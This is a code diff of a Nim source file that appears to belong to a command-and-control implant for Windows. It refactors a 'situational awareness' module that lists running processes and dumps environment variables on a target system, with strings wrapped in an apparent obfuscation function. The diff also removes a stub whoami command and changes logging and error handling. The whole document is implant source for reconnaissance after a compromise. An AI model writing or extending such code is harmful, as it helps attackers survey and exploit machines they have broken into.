@@ -3,11 +3,10 @@ import ../common/[types, utils]
 # Declare function prototypes
 proc executePs(ctx: AgentCtx, task: Task): TaskResult
 proc executeEnv(ctx: AgentCtx, task: Task): TaskResult
-proc executeWhoami(ctx: AgentCtx, task: Task): TaskResult
 
 # Module definition
 let module* = Module(
-    name: protect("situational-awareness"),
+    name: protect("systeminfo"),
     description: protect("Retrieve information about the target system and environment."),
     moduleType: MODULE_SITUATIONAL_AWARENESS,
     commands: @[
@@ -26,14 +25,6 @@ let module* = Module(
             example: protect("env"),
             arguments: @[],
             execute: executeEnv
-        ),
-        Command(
-            name: protect("whoami"),
-            commandType: CMD_WHOAMI,
-            description: protect("Get user information."),
-            example: protect("whoami"),
-            arguments: @[],
-            execute: executeWhoami
         )
     ]
 )
@@ -42,14 +33,13 @@ let module* = Module(
 when not defined(agent):
     proc executePs(ctx: AgentCtx, task: Task): TaskResult = nil
     proc executeEnv(ctx: AgentCtx, task: Task): TaskResult = nil
-    proc executeWhoami(ctx: AgentCtx, task: Task): TaskResult = nil
 
 when defined(agent): 
 
     import winim
-    import os, strutils, sequtils, strformat, tables, algorithm
+    import os, strutils, strformat, tables, algorithm
+    import ../agent/utils/io
     import ../agent/protocol/result
-    import ../common/utils
 
     # TODO: Add user context to process information
     type 
@@ -61,7 +51,7 @@ when defined(agent):
 
     proc executePs(ctx: AgentCtx, task: Task): TaskResult = 
         
-        echo protect("   [>] Listing running processes.")
+        print "   [>] Listing running processes."
         
         try: 
             var processes: seq[DWORD] = @[]
@@ -71,7 +61,7 @@ when defined(agent):
             # Take a snapshot of running processes
             let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
             if hSnapshot == INVALID_HANDLE_VALUE: 
-                raise newException(CatchableError, protect("Invalid permissions.\n"))
+                raise newException(CatchableError, GetLastError().getError)
             
             # Close handle after object is no longer used
             defer: CloseHandle(hSnapshot)
@@ -81,7 +71,7 @@ when defined(agent):
 
             # Loop over processes to fill the map            
             if Process32First(hSnapshot, addr pe32) == FALSE:
-                raise newException(CatchableError, protect("Failed to get processes.\n"))
+                raise newException(CatchableError, GetLastError().getError)
             
             while true: 
                 var procInfo = ProcessInfo(
@@ -135,7 +125,7 @@ when defined(agent):
 
     proc executeEnv(ctx: AgentCtx, task: Task): TaskResult = 
 
-        echo protect("   [>] Displaying environment variables.")
+        print "   [>] Displaying environment variables."
 
         try: 
             var output: string = ""
@@ -143,18 +133,6 @@ when defined(agent):
                output &= fmt"{key}: {value}" & '\n'
                
             return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
-
-        except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
-
-    proc executeWhoami(ctx: AgentCtx, task: Task): TaskResult = 
-
-        echo protect("   [>] Getting user information.") 
-
-        try: 
-
-            let output = protect("Not implemented") 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(output))
 
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
